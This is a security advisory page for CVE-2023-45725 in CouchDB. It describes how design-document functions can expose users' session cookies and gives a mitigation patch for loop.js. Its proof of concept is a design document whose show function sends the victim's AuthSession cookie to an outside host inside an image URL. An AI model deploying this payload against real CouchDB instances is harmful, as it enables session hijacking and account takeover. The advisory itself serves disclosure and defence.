{"hash":"0f23338e561558e64b15fe8ca6548b55721f8dce","data":{"post":{"title":"CouchDB Session Hijacking LocalPriv","path":"/vulnerabilities/couchdb-session-hijacking-localpriv/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>A CouchDB database admin can hijack sessions of arbitrary users when viewing design documents</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>couchdb</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(, 3.3.2], Fixed in 3.3.3</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>Design document functions which receive a user http request object may expose authorization or session cookie headers of the user who accesses the document.</p>\n<p>These design document functions are:</p>\n<ul>\n<li>list</li>\n<li>show</li>\n<li>rewrite</li>\n<li>update</li>\n</ul>\n<p>An attacker can leak the session component using an HTML-like output, insert the session as an external resource (such as an image), or store the credential in a <code>_local</code> document with an “update” function.</p>\n<p>For the attack to succeed the attacker has to be able to insert the design documents into the database, then manipulate a user to access a function from that design document.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>Design document example, that leaks the victim's session cookie -</p>\n<pre><code class=\"language-json\">{\n    \"_id\": \"_design/giveMeUrSessionPlz\",\n    \"shows\":\n    {\n        \"adminme\": \"function(doc, req){ \\\\n return '&#x3C;img src=\\\"http://localhost:1234/image.png?urAuth='+ req.cookie.AuthSession + '\\\" />'};\"\n    },\n    \"language\": \"javascript\"\n}\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>For versions older than 3.3.3 this patch applied to the loop.js file would also mitigate the issue:</p>\n<pre><code class=\"language-diff\">diff --git a/share/server/loop.js b/share/server/loop.js\n--- a/share/server/loop.js\n+++ b/share/server/loop.js\n@@ -49,6 +49,20 @@ function create_nouveau_sandbox() {\n   return sandbox;\n }\n​\n+function scrubReq(args) {\n+  var req = args.pop()\n+  if (req.method &#x26;&#x26; req.headers &#x26;&#x26; req.peer &#x26;&#x26; req.userCtx) {\n+    delete req.cookie\n+    for (var p in req.headers) {\n+      if (req.headers.hasOwnProperty(p) &#x26;&#x26; [\"authorization\", \"cookie\"].indexOf(p.toLowerCase()) !== -1) {\n+        delete req.headers[p]\n+      }\n+    }\n+  }\n+  args.push(req)\n+  return args\n+}\n+\n // Commands are in the form of json arrays:\n // [\"commandname\",..optional args...]\\n\n //\n@@ -85,7 +99,7 @@ var DDoc = (function() {\n         var funPath = args.shift();\n         var cmd = funPath[0];\n         // the first member of the fun path determines the type of operation\n-        var funArgs = args.shift();\n+        var funArgs = scrubReq(args.shift());\n         if (ddoc_dispatch[cmd]) {\n           // get the function, call the command with it\n           var point = ddoc;\n</code></pre>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://docs.couchdb.org/en/stable/cve/2023-45725.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vendor advisory</a></p>\n","description":"CVE-2023-45725, MEDIUM, A CouchDB database admin can hijack sessions of arbitrary users when viewing design documents","date_published":"2023-12-14","xray_id":"","vul_id":"CVE-2023-45725","severity":"medium","discovered_by":"Natan Nehorai","last_updated":"2023-12-14","cvss":6.5}},"context":{}}